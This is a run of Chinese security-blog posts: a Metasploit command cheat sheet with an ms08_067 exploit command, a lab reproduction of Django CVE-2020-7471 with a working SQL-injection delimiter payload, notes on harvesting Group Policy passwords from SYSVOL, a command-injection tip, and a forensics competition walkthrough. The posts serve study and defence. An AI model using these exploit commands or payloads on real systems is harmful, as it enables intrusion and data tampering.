<h2 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a>MSFcli命令</h2><ul>
<li>msfcli | grep exploit<br>仅列出渗透攻击模块。</li>
<li>msfcli | grep exploit/windows,<br>仅列出与windows相关的渗透攻击模块。</li>
<li>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</li>
</ul>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul>
<li>show exploits<br>列出metasploit框架中的所有渗透攻击模块。</li>
<li>show payloads<br>列出metasploit框架中的所有攻击载荷。</li>
<li>show auxiliary<br>列出metasploit框架中的所有辅助攻击载荷。</li>
<li>search name<br>查找metasploit框架中所有的渗透攻击和其他模块。</li>
<li>info<br>展示出制定渗透攻击或模块的相关信息。</li>
<li>use name<br>装载一个渗透攻击或模块。</li>
<li>LHOST<br>本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</li>
<li>RHOST<br>远程主机或是目标主机。</li>
<li>set function<br>设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>setg function<br>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>show options<br>列出某个渗透攻击或模块中所有的配置参数。</li>
<li>show targets<br>列出渗透攻击所有支持的目标平台。</li>
<li>set target num<br>指定你所知道的目标的操作系统以及补丁版本类型。</li>
<li>set payload name<br>指定想要使用的攻击载荷。</li>
<li>show advanced<br>列出所有高级配置选项。</li>
<li>set autorunscript migrate -f.<br>在渗透攻击完成后，将自动迁移到另一个进程。</li>
<li>check<br>检测目标是否选定渗透攻击存在相应的安全漏洞。</li>
<li>exploit<br>执行渗透攻击或模块来攻击目标。</li>
<li>exploit -j<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</li>
<li>exploit -z<br>渗透攻击完成后不与回话进行交互。</li>
<li>exploit -e encoder<br>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</li>
<li>exploit -h<br>列出exploit命令的帮助信息。</li>
<li>sessions -l<br>列出可用的交互会话（在处理多个shell时使用）。</li>
<li>sessions -l -v<br>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</li>
<li>sessions -s script<br>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</li>
<li>sessions -K<br>杀死所有活跃的交互会话。</li>
<li>sessions -c cmd<br>在所有活跃的metasploit会话上执行一个命令。</li>
<li>sessions -u sessionID<br>升级一个普通的win32 shell到metasploit shell。</li>
<li>db_create name<br>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</li>
<li>db_connect name<br>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</li>
<li>db_namp<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</li>
<li>db_autopwn -h<br>展示出db_autopwn命令的帮助信息。</li>
<li>db_autopwn -p -r -e<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy<br>删除当前数据库。</li>
<li>db_destroy user：passwd@host：port/database<br>使用高级选项来删除数据库。</li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a href="https://blog.csdn.net/qq_34801745/article/details/110790957">https://blog.csdn.net/qq_34801745/article/details/110790957</a></li>
<li>详细章节：<a href="https://blog.csdn.net/qq_34801745/article/details/110790957?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_34801745/article/details/110790957?spm=1001.2014.3001.5502</a></li>
</ol>
]]></content>
      <tags>
        <tag>web安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Django-sql注入漏洞复现-CVE-2020-7471</title>
    <url>/2021/03/29/Django-sql/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Django作为开放源码的Web应用python框架，作为最有代表性的web框架，构建了多种网站和APP。Django负责处理网站开发中麻烦的部分，因此让开发者专注于应用程序的编写。其采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template），注重组件的重用性和“可插拔性”。<br><strong>原理</strong><br>通过构造分隔符，传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义符号（\）来注入恶意SQL语句。<br>漏洞的核心是StringAgg(delimiter),StringAgg聚合函数的delimiter参数存在SQL注入漏洞。</p>
<p>介绍下StringAgg，它会将输入的值使用 delimiter 分隔符级联起来。比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br></pre></td></tr></table></figure>

<p>这个查询操作就是查询 Info 对应的 postgres 数据表的 gender 列，将gender相同的 name 列使用横线连接聚合，输入如下：</p>
<p><img src="/2021/03/29/Django-sql/12.jpg"></p>
<p>漏洞位于django/django/contrib/postgres/aggregates/general.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from django.contrib.postgres.aggregates import StringAgg</span><br></pre></td></tr></table></figure>

<p>可以看到官方使用Value函数来防止注入，Value函数的内容如下</p>
<p><img src="/2021/03/29/Django-sql/10.jpg"></p>
<p><img src="/2021/03/29/Django-sql/11.jpg"></p>
<p>Value参数会被添加到sql参数列表，然后被Django内置的过滤机制过滤，来防注。</p>
<p>如何导致SQL 注入：<a href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec">django</a>/<a href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django">django</a>/<a href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib">contrib</a>/<a href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres">postgres</a>/<a href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres/aggregates">aggregates</a>/general.py</p>
<p><img src="/2021/03/29/Django-sql/14.jpg"></p>
<p>delimiter没有任何过滤，我们可以通过闭合单引号来利用注入</p>
<p><img src="/2021/03/29/Django-sql/4.png"></p>
<p>(此图摘自先知社区)</p>
<p>测试发现，当delimiter为单引号时，会报错。可以看出单引号未经过任何转义嵌入到了 SQL 语句中，然后需要追踪内部程序找出完整的 SQL 语句上下文。从上面的图中可以看出来，查询语句调用了self.cursor.execute，sql变量还没嵌入时，delimiter 的值如下：</p>
<p><img src="/2021/03/29/Django-sql/5.png"></p>
<p>（此图摘自先知社区）</p>
<p><img src="/2021/03/29/Django-sql/5.png"></p>
<p>运行后看到此时sql已加入delimiter为单引号的取值。因为此处sql为字符串，所以需要转义。若是postgres则会执行以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &quot;vul_app_info&quot;.&quot;gender&quot;, STRING_AGG(&quot;vul_app_info&quot;.&quot;name&quot;, &#39;&#39;&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1</span><br></pre></td></tr></table></figure>

<p>此时三个单引号会导致语法错误，postgres的注释符为’)–。将delimiter设置为<code>&#39;)--</code>，可以成功注释from语句</p>
<p>为构造合法的上下文，将 delimiter设置为</p>
<p>**’-&#39;) AS “mydefinedname” FROM “vul_app_info” GROUP BY “vul_app_info”.”gender” LIMIT 1 OFFSET 1 – ‘  **</p>
<p>输出为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>若设置delimiter为<code>-</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delimiter&#x3D;&quot;-&quot;</span><br></pre></td></tr></table></figure>

<p>该语句使用StringAgg类，用于将输入的值使用delimiter分隔符级联。原本的语句中，查询info对应的gender列，并使用-来连接。就可以<strong>通过修改delimiter的内容来实现注入</strong>。</p>
<p>输出为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;female&#39;, &#39;mydefinedname&#39;: &#39;zhang&#39;&#125;</span><br><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;-&#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br><span class="line">   print(&quot;[+]注入后的的输出：&quot;)</span><br><span class="line">   payload &#x3D; &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br></pre></td></tr></table></figure>



<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><ul>
<li>影响版本<br>Django 1.11.x &lt; 1.11.28<br>Django 2.2.x &lt; 2.2.10<br>Django 3.0.x &lt; 3.0.3<br>Django 主开发分支<br>其中Django 1.11.28、Django 2.2.10、Django 3.0.3不受影响。</li>
<li>测试环境<br>kalil<br>Django 3.0.2<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2>pip install django==3.0.2<br>安装postgres数据库，创建数据库test,并修改数据库密码<br><img src="/2021/03/29/Django-sql/1.png"><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2></li>
</ul>
<ol>
<li>由于刚才更改了数据库密码，于是更改配置文件的数据库名称以及密码<br>进入CVE-2020-7471/sqlvul_projects/settings.py，修改数据库配置，如果之前安装postgres数据库使用的默认配置（包括密码），这里就不需修改任何任何配置.<br>此处只需修改password为刚才设置密码。<br><img src="/2021/03/29/Django-sql/2.png"><br><img src="/2021/03/29/Django-sql/3.png"></li>
<li>再利用CVE-2020-7471/manage.py初始化测试数据库test数据库中的表<br><img src="/2021/03/29/Django-sql/4.jpg"><br>初始化环境完成。</li>
<li>进入test数据库查看表<br>进入数据库<br>\c test<br>查看全部表<br>\d<br><img src="/2021/03/29/Django-sql/5.jpg"><br>查看表vul_app_info的信息<br>select * from vul_app_info;<br><img src="/2021/03/29/Django-sql/6.jpg"><br>可以看到此刻表为空</li>
<li>执行POC向数据库写入数据<br><img src="/2021/03/29/Django-sql/7.jpg"><br>若执行成功POC中将插入三条数据<br>利用CVE-2020-7471/CVE-2020-7471.py写入数据<br><img src="/2021/03/29/Django-sql/8.jpg"><br><img src="/2021/03/29/Django-sql/9.jpg"><br>写入成功。<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2>升级到Django最新版3.0.3<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3></li>
</ol>
<ul>
<li><a href="https://github.com/Saferman/CVE-2020-7471">https://github.com/Saferman/CVE-2020-7471</a></li>
<li><a href="https://www.freebuf.com/vuls/255947.html">https://www.freebuf.com/vuls/255947.html</a></li>
<li><a href="https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/">https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/</a></li>
</ul>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>sql注入</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透</title>
    <url>/2021/03/28/domain/</url>
    <content><![CDATA[<h1 id="翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory"><a href="#翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory" class="headerlink" title="翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory"></a>翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory</h1><p> 攻击者有很多方法可以获得活动目录中的域管理权限。本篇文章旨在介绍一些目前比较流行的方法。这里描述的 “assume breach”建立在攻击者已经在内部系统上有了立足点，并获得了域用户凭证（即后渗透阶段）。<br>不幸的是，对于大多数企业来说，攻击者从域用户到域管理员往往不需要很长时间。防御者心中的问题是 “这种情况是如何发生的？”。<br>攻击通常从向用户发送鱼叉式钓鱼电子邮件开始，使攻击者能够在目标网络内的计算机上运行代码。一旦攻击者让他们的代码在企业内部运行，第一步就是进行侦察，发现可用资源，从而提升权限，坚持下去，当然还有收集关键信息（通常是一个组织的 “皇冠上的珠宝”）。<br>While the overall process detail varies, the overall theme remains:<br>虽然流程细节各不相同，但总的主题仍然是：<br>恶意软件注入(鱼叉式钓鱼、web漏洞等)<br>内部侦察<br>窃取凭证<br>利用及提权<br>数据访问及过滤<br>后门维持<br>攻击者首先得在企业内部有一个立足点。此外，攻击者通常从攻击者的用户权限提升到本地管理员权限并不是很难。提权利用可以通过利用系统上未打补丁的权限升级漏洞来实现，更为常见的是在SYSVOL（如组策略首选项）中找到本地管理员密码。<br>在2015年举办的BSides, Shakacon, Black Hat, DEF CON, 和 DerbyCon这五个安全会议中，我谈到了本文中的大部分技术。<br>我也在 “The Most Common Active Directory Security Issues and What You Can Do to Fix Them “一文中介绍了其中的一些问题。</p>
<p>从域用户到域管理员的攻击技术：<br>1.SYSVOL和组策略首选项中的密码<br>这种方法是最简单的，不需要特殊的 “黑客 “工具。攻击者所要做的就是打开Windows资源管理器，搜索域SYSVOL DFS共享中的XML文件。大多数情况下，groups.xml、scheduletasks.xml、Services.xml等XML文件会包含凭证。</p>
<p>SYSVOL是Active Directory中的域范围共享，AD中所有经过认证的用户都可以读取访问。SYSVOL包含登录脚本、组策略数据和其他需要在有域控制器的任何地方提供的域范围内的数据（因为SYSVOL在所有域控制器之间自动同步和共享）。所有域组策略都存储在这里/DOMAIN&gt; /SYSVOL/<br><DOMAIN>/Policies/</DOMAIN></p>
<p>当创建一个新的GPP时，会在SYSVOL中创建一个相关的XML文件，里面有相关的配置数据，如果有提供密码，则是AES-256加密、。</p>
<p>除了在2012年之前，微软在MSDN上公布了AES加密密钥（共享秘密），可以用来解密密码。由于经过认证的用户（任何域用户或受信任域中的用户）都有对SYSVOL的读取权限，因此域中的任何人都可以在SYSVOL共享中搜索包含 “cpassword “的XML文件，该文件是包含AES加密密码的值。<br><img src="/2021/03/28/domain/1.png"><br>通过访问这个XML文件，攻击者可以使用AES私钥来解密GPP密码。PowerSploit函数Get-GPPPassword对于组策略优先级的利用最为有用。以上截图显示了一个类似的PowerShell函数，从SYSVOL中找到的XML文件中加密GPP密码。<br><img src="/2021/03/28/domain/2.png"><br>其他文件类型也可能有内嵌的密码（通常是明文的），如vbs和bat。<br><img src="/2021/03/28/domain/3.jpeg"><br>我们会认为，随着补丁的发布，管理员应该不会再在组策略首选项中放置凭证，但是我在评估客户安全时，仍然会在SYSVOL中发现凭证。</p>
<p>解决方法：</p>
<ul>
<li>在每台用于管理GPO的计算机上安装KB2962486，它可以防止新的凭证被放在组策略首选项中。</li>
<li>删除SYSVOL中包含密码的现有GPP xml文件。</li>
<li>不要把密码放在所有经过认证的用户都能访问的文件中。<br>关于这种攻击方法的更多信息在帖子中介绍。Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences.</li>
</ul>
]]></content>
      <categories>
        <category>靶机Vulhub</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>渗透测试</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>小知识思考</title>
    <url>/2021/03/28/sparrow/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>鉴于经常会有奇怪的思想，故而为自己专门书写这么一篇文章，想到什么记什么。</p>
<p>包含<strong>任务、所好奇之事</strong>等</p>
<h2 id="0x02-具现"><a href="#0x02-具现" class="headerlink" title="0x02 具现"></a>0x02 具现</h2><h3 id="1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？"><a href="#1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？" class="headerlink" title="1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？"></a>1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？</h3><ol>
<li><p><strong>输入地址</strong><br>输入地址时，浏览器其实已经开始只能匹配URL，用于补全。当然如果有缓存，直接从缓存中展示网页。</p>
</li>
<li><p><strong>浏览器查找域名IP</strong><br>查看本地hosts文件，查看其中是否有与此域名对应的规则，如果有，则直接用此IP；<br>若无，向本地DNS服务器(自己网络接入服务器商所提供)发出请求，服务器会查询其缓存记录；<br>若无，本地服务器向DNS根服务器查询；<br>若无，根据跟服务器给出的域服务器地址，让本地DNS服务器去找域服务器；<br>.com域服务器返回本地服务器的域名解析服务器的地址；<br>本地服务器向域名解析服务器发出请求，收到域名与IP地址的对应关系。并保存于缓存中用于下次快速访问。</p>
</li>
<li><p><strong>浏览器向web服务器发送HTTP请求</strong><br>浏览器以随机端口[1024-65535]向服务器的web服务(nginx、httpd)80端口发起TCP连接请求。通过多种路由设备，进入网卡，然后进入到内核的TCP/IP协议栈对该包进行解封。可能还要经过Netfilter防火墙(内核模块的过滤)<br>，最终到达web程序，建立TCP连接。常称TCP三次握手。<br>建立TCP连接后，发起HTTP请求。GET、POST、PUT 和 DELETE 、HEAD、OPTION以及 TRACE。<br>http请求一般包含三部分：请求方法URL协议/版本(第一行)、请求头(Request Header)、请求正文。<br>请求头和请求正文之前存在一个空行，表示请求头已经结束，接下来的是请求正文</p>
</li>
<li><p><strong>服务器的永久重定向响应</strong><br>server给浏览器响应一个301永久重定向响应，301永久重定向：把带www的和不带www的访问地址归到同一个网站排名下</p>
</li>
<li><p><strong>浏览器跟踪重定向地址</strong><br>浏览器知道<a href="http://www.google.com/">http://www.google.com/</a> 是访问的正确地址，所以发送另一个http请求。</p>
</li>
<li><p><strong>服务器处理请求</strong><br>后端从固定端口接收TCP报文，处理TCP连接，解析HTTP协议，按照报文格式封装成供上层使用的HTTP Request对象；<br>大网站使用反向代理服务器时，客户端先请求到nginx，nginx再请求应用服务器，最后将结果返回给客户端，Nginx是反向代理服务器。以免某台服务器down了，影响用户使用。<br><img src="/2021/03/28/sparrow/3.jpg"></p>
</li>
<li><p><strong>服务器返回一个HTTP响应</strong><br>HTTP响应与HTTP请求相似，由3个部分构成:状态行、响应头(Response Header)、响应正文</p>
</li>
</ol>
<ol start="8">
<li><strong>浏览器显示 HTML</strong><br>WebKit引擎渲染的过程：<br>解析html以构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</li>
<li><strong>浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS等等）</strong></li>
</ol>
<ul>
<li><p>DNS负载均衡<br>针对请求资源膨胀的情况，为了防止机子down掉。<br>原理：在DNS服务器中为同一个主机名配置多个IP地址，在应答DNS查询时，将DNS文件中主机记录的IP地址按顺序访问返回不同的解析结果。使得不同客户端访问不同服务器，从而能达到负载均衡的目的。</p>
</li>
<li><p>为什么需要三次握手？</p>
</li>
</ul>
<p><strong>第一次握手：</strong>client将标志位SYN置为1,随机产生一个值为seq=J（J的取值范围为=1234567）的数据包到服务器，client进入SYN_SENT状态，等待server确认；</p>
<p><strong>第二次握手：</strong>server收到数据包后由标志位SYN=1知道client请求建立连接，server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给client以确认连接请求，server进入SYN_RCVD状态。</p>
<p><strong>第三次握手：</strong>client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给server，server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，client和server进入ESTABLISHED状态，完成三次握手，随后client与server之间可以开始传输数据了。</p>
<p>三次握手”的目的是为了<strong>防止已失效的连接请求报文段突然又传送到了服务端，产生错误。</strong><br>某滞留请求延迟发给服务端，服务器返回确认报文，若是client一直不确认，server会一直等待，造成资源浪费。<br><img src="/2021/03/28/sparrow/1.jpg"></p>
<ul>
<li>为什么需要四次挥手？</li>
<li><em>第一次挥手：</em>* Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。</li>
</ul>
<p><strong>第二次挥手：</strong> Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与- SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</p>
<p><strong>第三次挥手：</strong> Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</p>
<p><strong>第四次挥手：</strong> Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。<br>四次挥手，在server收到对方的FIN时，表示client不再发送数据，但是还可以接收server的数据。所以将ACK和FIN分开发送。<br><img src="/2021/03/28/sparrow/2.jpg"></p>
<h3 id="3-命令"><a href="#3-命令" class="headerlink" title="3.命令"></a>3.命令</h3><p>tar xzvf<br>sudo ufw disable</p>
<p>mv用来改名哦.cp更靠谱一点</p>
<h3 id="4-tips"><a href="#4-tips" class="headerlink" title="4. tips"></a>4. tips</h3><p>对于命令注入不过滤参数的：&amp;</p>
<p><img src="/2021/03/28/sparrow/4.jpg"></p>
<h3 id="5-nmap"><a href="#5-nmap" class="headerlink" title="5.nmap"></a>5.nmap</h3><p><strong>nmap -sn</strong>  ping scan, - disable port scan</p>
]]></content>
  </entry>
  <entry>
    <title>2019 ChangAn Cup复盘</title>
    <url>/2021/03/24/changAnCup/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>话不多说 直接复盘 查漏补缺</p>
<h2 id="0x02-分析思路"><a href="#0x02-分析思路" class="headerlink" title="0x02 分析思路"></a>0x02 分析思路</h2><h3 id="检材1："><a href="#检材1：" class="headerlink" title="检材1："></a>检材1：</h3><p>使用仿真对检材1进行分析，开机后发现该Linux无法使用密码远程连接，修改配置文件/etc/ssh/sshd_config文件进行配置：<br>把PasswordAuthentication后的参数改为yes，重启ssh服务（systemctl restart sshd）即可使用远程工具连接；<br><img src="/2021/03/24/changAnCup/clipboard.png"></p>
<p>查看历史执行命令history，可看到少数命令，怀疑本地的历史命令被加密，/var/log日志目录被删除：<br><img src="/2021/03/24/changAnCup/1.png"><br>netstat -anptl查看服务器开启的端口发现8091和39999上有docker-proxy<br><img src="/2021/03/24/changAnCup/2.png"><br>使用docker ps命令查看docker容器情况，发现docker运行了3个容器，其中验证了第二个ssh的容器属于干扰项，没有作用；<br><img src="/2021/03/24/changAnCup/3.png"><br><img src="/2021/03/24/changAnCup/4.png"></p>
<p>id为16fc..的容器将自身80端口映射到了本机8091端口上，主要运行的命令为nginx；<br>id为53766的容器开启了8012端口，主要运行命令docker-entrypoint.sh；<br>使用docker inspect 命令可以查看到容器详细信息，如下：<br><img src="/2021/03/24/changAnCup/5.png"><br><img src="/2021/03/24/changAnCup/6.png"><br><img src="/2021/03/24/changAnCup/7.png"><br><img src="/2021/03/24/changAnCup/8.png"><br><img src="/2021/03/24/changAnCup/9.png"><br><img src="/2021/03/24/changAnCup/10.png"><br><img src="/2021/03/24/changAnCup/11.png"><br><img src="/2021/03/24/changAnCup/12.png"><br>使用命令 docker exec -it id号 /bin/bash可以进入到容器内部，16fc160060c1容器内主要运行nginx服务，因此查看nginx配置文件：<br><img src="/2021/03/24/changAnCup/13.png"><br><img src="/2021/03/24/changAnCup/14.png"><br>通过查看nginx配置文件可以知道，nginx访问日志放在相对路径logs下的jrweb.log中，nginx将所有来自自身80端口的请求转发到IP为172.17.0.3的8012端口上，由ID为53766d68636f的容器开启的8012端口可知，应该是转发到该容器，该容器（53766d68636f）在案件中的ip应为172.172.0.3（由于出题时候未设固定ip因此每个人仿真起来之后ip可能会发生变化，前面查看docker inspect时候可看到该容器ip变化为172.17.0.2）；<br><img src="/2021/03/24/changAnCup/15.png"><br>通过查看访问网站的访问日志jrweb.log可知，该网站案发当时的IP地址为192.168.184.128，使用端口8091，分别有ip192.168.184.1和192.168.184.133对该网站进行过访问，133的ip可以看到有尝试登陆的请求；<br><img src="/2021/03/24/changAnCup/16.png"><br>查看Id为53766d68636f的容器，查看history命令可知网站路径为/home/vue2-element-touzi-admin（物理机路径可以查看前面docker inspect），<br><img src="/2021/03/24/changAnCup/17.png"><br><img src="/2021/03/24/changAnCup/18.png"><br>网站根目录下有README.md文件，通过查看可了解网站大致的配置情况，查看server目录下的index.js可知网站的主要配置情况<br><img src="/2021/03/24/changAnCup/19.png"><br>查看server目录下的api.js文件课知，该文件引用了当前目录下的db文件<br><img src="/2021/03/24/changAnCup/20.png"><br>查看网站/server目录下的db.js文件可知，该网站使用mongo的数据库，数据库用户名和密码为root、root，网站使用站库分离结构，数据地址位于192.168.184.129（该ip为检材2的解压密码），使用端口27017，使用的databases为tougu；<br><img src="/2021/03/24/changAnCup/21.png"></p>
<h3 id="检材2："><a href="#检材2：" class="headerlink" title="检材2："></a>检材2：</h3><p>使用192.168.184.129对检材2进行解压，对检材计算哈希并及进行静态分析和仿真：<br>使用history命令发现如下信息：下载过某程序、执行了encrypt（5）程序，删掉了之前的bash历史记录：<br><img src="/2021/03/24/changAnCup/22.png"><br>前面分析已知该服务器为mongodb服务器，通过端口确认mongo监听在27017端口<br><img src="/2021/03/24/changAnCup/23.png"><br>通过/root/.dbshell发现数据库操作的shell记录，里面发现几条重要信息（由于shell没有时间戳，只能用来推测不能单过证据）<br><img src="/2021/03/24/changAnCup/24.png"><br>通过查看mongo进程信息发现mongo的配置信息，查看mongod.conf文件发现mongod的日志配置情况和安装物理路径。<br><img src="/2021/03/24/changAnCup/25.png"><br><img src="/2021/03/24/changAnCup/26.png"><br>结合系统登陆日志和mongo的日志查看，发现在时间7-11 18：05至18：32分中间，133IP一直在登录状态，同时间没有其他用户登陆，日志中，同时间端发现大量的操作日志，drop为删除数据库指令<br><img src="/2021/03/24/changAnCup/27.png"><br><img src="/2021/03/24/changAnCup/28.png"><br><img src="/2021/03/24/changAnCup/29.png"><br><img src="/2021/03/24/changAnCup/30.png"></p>
<h3 id="检材3"><a href="#检材3" class="headerlink" title="检材3"></a>检材3</h3><p>使用192.168.184.133对检材3进行解压，对检材计算哈希并及进行静态分析和仿真：<br>通过history命令查看历史命令记录，可以看到大量安装配置pptpd（pptpd是指运行在服务器上提供pptp协议服务的软件）的命令：<br><img src="/2021/03/24/changAnCup/31.png"><br>其中还有大量修改时区信息的命令<br><img src="/2021/03/24/changAnCup/32.png"><br>数据包抓取的命令：<br><img src="/2021/03/24/changAnCup/33.png"><br>通过查看pptpd的配置文件可知如下信息：配置了options.pptpd、开启写入wtmp、定义了本地远程IP地址（可以参看教程<a href="https://blog.csdn.net/ljm_503909378/article/details/41478121%EF%BC%89%EF%BC%9A">https://blog.csdn.net/ljm_503909378/article/details/41478121）：</a><br><img src="/2021/03/24/changAnCup/34.png"><br><img src="/2021/03/24/changAnCup/35.png"><br><img src="/2021/03/24/changAnCup/36.png"><br>查看/etc/ppp/options.pptp文件可以知道，pptpd开启了日志信息，记录在/var/log/pptpd.log中（当然在历史命令中也可以得知该日志）：<br><img src="/2021/03/24/changAnCup/37.png"><br>继续查看该目录下的chap-secrets文件，该文件为用户验证文件，记录了客户端的使用名称和密码：<br><img src="/2021/03/24/changAnCup/38.png"><br>查看pptpd的日志进行分析，发现IP为172.16.80.188通过账号VPN1成功登陆VPN服务器，时间为2019-07-13 14：15：37 UTC+6(注意！该服务器时区为UTC+6,与北京时间相差2小时)，这段时间内还有多个IP通过VPN2\3\4等账号连结果vpn服务器（干扰项），结合下面的PCAP文件可以进行排查筛选：<br><img src="/2021/03/24/changAnCup/39.png"><br><img src="/2021/03/24/changAnCup/40.png"><br><img src="/2021/03/24/changAnCup/41.png"><br>查看last登陆成功日志可以对应上时间：<br><img src="/2021/03/24/changAnCup/42.png"><br>已知该服务器中存在着数据包文件，将两个文件导出并进行分析，查看到两个文件的内容，该vpn服务器为双网卡，对内IP为192.168.184.133，具备对检材1（192.168.184.128）和检材2（192.168.184.129）访问权限，出口/服务端IP为172.16.80.92，通过分析可发现IP172.16.80.188在北京时间16：15-17：58之前进行了大量的操作，以192.168.184.133的身份对目标网站进行了连接和访问：<br><img src="/2021/03/24/changAnCup/43.png"><br><img src="/2021/03/24/changAnCup/44.png"></p>
<h3 id="检材4"><a href="#检材4" class="headerlink" title="检材4"></a>检材4</h3><p>使用密码172.16.80.188对检材4进行解压，并使用火眼介质分析和火眼仿真对该介质进行动态和静态分析：</p>
